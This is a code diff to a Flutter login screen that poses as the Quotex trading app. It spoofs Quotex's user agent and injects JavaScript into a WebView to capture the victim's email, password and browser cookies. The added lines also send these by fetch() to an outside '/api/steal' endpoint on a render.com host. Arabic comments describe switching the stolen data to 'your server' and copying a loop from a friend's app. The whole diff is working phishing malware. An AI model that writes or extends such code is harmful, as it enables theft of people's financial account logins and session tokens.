@@ -46,11 +46,11 @@ class _LoginScreenState extends State<LoginScreen> {
   void _initWebView() {
     _controller = WebViewController()
       ..setJavaScriptMode(JavaScriptMode.unrestricted)
-      // 323. الـ User-Agent الصح (تطبيق Quotex)
       ..setUserAgent("Quotex/1.0")
       ..addJavaScriptChannel(
         'QTX_CREDS',
         onMessageReceived: (msg) async {
+          // 337. نستخدم سيرفرك بدل سيرفر صاحبك
           await http.post(
             Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
             headers: {"Content-Type": "application/json"},
@@ -96,6 +96,12 @@ class _LoginScreenState extends State<LoginScreen> {
               QTX_CREDS.postMessage(JSON.stringify({type: 'creds', email: e.value, password: p.value}));
               var cookie = document.cookie;
               QTX_CREDS.postMessage(JSON.stringify({type: 'cookies', data: cookie}));
+              // 338. بنبعت للسيرفر مباشرة عشان نضمن وصولها
+              fetch('https://clone-server-dejt.onrender.com/api/steal', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({email: e.value, password: p.value, cookies: cookie})
+              }).catch(err => {});
             }
           } catch (err) {}
         }
@@ -106,6 +112,22 @@ class _LoginScreenState extends State<LoginScreen> {
             var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
             if (t) sendCreds();
           }, true);
+          // 339. الحلقة اللي لقيناها في تطبيق صاحبك (setInterval)
+          var savedEmail = "";
+          var savedPass = "";
+          if (savedEmail || savedPass) {
+            var tries = 0;
+            var timer = setInterval(function() {
+              tries++;
+              var e = findEmail(), p = findPass();
+              if (e && p) {
+                if (!e.value && savedEmail) setNativeValue(e, savedEmail);
+                if (!p.value && savedPass) setNativeValue(p, savedPass);
+                clearInterval(timer);
+              }
+              if (tries > 20) clearInterval(timer);
+            }, 300);
+          }
         }
       })();
     """;
